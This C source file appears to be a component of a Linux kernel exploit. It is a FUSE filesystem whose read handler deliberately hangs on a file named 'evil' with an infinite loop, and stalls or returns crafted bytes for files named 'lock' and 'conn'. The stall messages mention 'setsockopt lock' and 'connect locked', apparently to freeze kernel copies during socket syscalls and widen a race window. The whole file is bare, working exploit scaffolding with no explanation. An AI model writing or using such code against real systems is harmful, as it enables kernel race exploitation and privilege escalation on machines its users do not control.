#include "fake_fuse.h"

const char *evil_path = "evil";
const char *lock_acq = "lock";
const char *conn_lock = "conn";
int fuse_pipes[2];

int evil_read(const char *path, char *buf, size_t size, off_t offset,
              struct fuse_file_info *fi)
{
    char signal;
    char evil_buffer[0x1000];
    size_t len = 0x1000;

    memset(evil_buffer, 'a', 0x1000);
    if(strcmp(path + 1, lock_acq) == 0){
	printf("setsockopt lock\n");
        memcpy(buf, lock_acq, 4);
        sleep(2);
        return size;
    }
    
    if(strcmp(path + 1, conn_lock) == 0){
	printf("connect locked\n");
        int i;
	for(i = 0; i < 6; i++)
		buf[i] = 0xff;

//	sleep(5);
        return size;
    }

    if (strcmp(path + 1, evil_path) == 0)
    {
        if(offset >= len)
            return 0;
        if(offset + size > len)
            size = len - offset;
        while (1){}
        
        memcpy(buf, evil_buffer + offset, size);
        
        read(fuse_pipes[0], &signal, 1);
        return size;
    }
    return size;
}

int evil_getattr(const char *path, struct stat *stbuf)
{
    int res = 0;

    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0)
    {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    }
    else if (strcmp(path + 1, evil_path) == 0)
    {
        stbuf->st_mode = S_IFREG | 0666;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
    }
    else if (strcmp(path + 1, lock_acq) == 0)
    {
        stbuf->st_mode = S_IFREG | 0666;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
    }
    else if (strcmp(path + 1, conn_lock) == 0)
    {
        stbuf->st_mode = S_IFREG | 0666;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
    }
    else
    {
        res = -ENOENT;
    }

    return res;
}

int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
             off_t offset, struct fuse_file_info *fi)
{
    if (strcmp(path, "/") != 0)
        return -ENOENT;

    filler(buf, ".", NULL, 0);
    filler(buf, "..", NULL, 0);
    filler(buf, evil_path, NULL, 0);
    filler(buf, lock_acq, NULL, 0);
    filler(buf, conn_lock, NULL, 0);
    return 0;
}
